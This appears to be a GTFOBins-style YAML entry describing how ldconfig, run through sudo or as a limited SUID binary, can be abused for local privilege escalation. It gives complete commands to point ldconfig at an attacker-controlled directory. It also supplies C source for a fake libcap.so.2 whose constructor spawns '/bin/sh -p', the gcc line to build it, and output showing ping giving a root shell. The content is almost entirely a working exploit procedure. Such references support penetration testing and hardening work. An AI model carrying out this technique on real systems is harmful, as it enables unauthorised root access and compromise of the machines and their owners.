---
description: |
  Follows a minimal example of how to use the described technique (details may change across different distributions).

  Run the code associated with the technique.

  Identify a target SUID executable, for example the `libcap` library of `ping`:

  ```
  $ ldd /bin/ping | grep libcap
        libcap.so.2 => /tmp/tmp.9qfoUyKaGu/libcap.so.2 (0x00007fc7e9797000)
  ```

  Create a fake library that spawns a shell at bootstrap:

  ```
  echo '#include <unistd.h>

  __attribute__((constructor))
  static void init() {
      execl("/bin/sh", "/bin/sh", "-p", NULL);
  }
  ' >"$TF/lib.c"
  ```

  Compile it with:

  ```
  gcc -fPIC -shared "$TF/lib.c" -o "$TF/libcap.so.2"
  ```

  Run `ldconfig` again as described below then just run `ping` to obtain a root shell:

  ```
  $ ping
  # id
  uid=1000(user) gid=1000(user) euid=0(root) groups=1000(user)
  ```
functions:
  sudo:
    - description: This allows to override one or more shared libraries. Beware though that it is easy to *break* target and other binaries.
      code: |
        TF=$(mktemp -d)
        echo "$TF" > "$TF/conf"
        # move malicious libraries in $TF
        sudo ldconfig -f "$TF/conf"
  limited-suid:
    - description: This allows to override one or more shared libraries. Beware though that it is easy to *break* target and other binaries.
      code: |
        TF=$(mktemp -d)
        echo "$TF" > "$TF/conf"
        # move malicious libraries in $TF
        ./ldconfig -f "$TF/conf"
---
